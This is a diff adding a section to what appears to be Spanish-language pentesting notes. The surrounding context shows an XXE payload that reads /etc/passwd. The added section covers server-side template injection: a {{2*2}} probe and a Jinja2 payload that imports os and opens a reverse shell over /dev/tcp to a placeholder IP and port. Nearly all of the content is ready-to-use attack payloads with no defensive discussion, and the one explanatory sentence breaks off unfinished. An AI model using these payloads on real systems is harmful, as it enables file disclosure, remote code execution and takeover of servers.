@@ -43,3 +43,21 @@ Ocurre cuando una aplicación procesa datos XML sin configurar correctamente el 
 ```bash
 <?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]><foo>&xxe;</foo>
 ```
+## STTI: Server-Side Template Injection
+
+Cuando el usuario puede insertar datos de usuario dentro de la pagina y el servidor no valida correctamente 
+
+prueba:
+
+  
+
+```bash
+{{2*2}}
+```
+
+shell:
+ ``
+
+```bash
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "sh -i >& /dev/tcp/IP/PORT 0>&1"').read() }}
+```
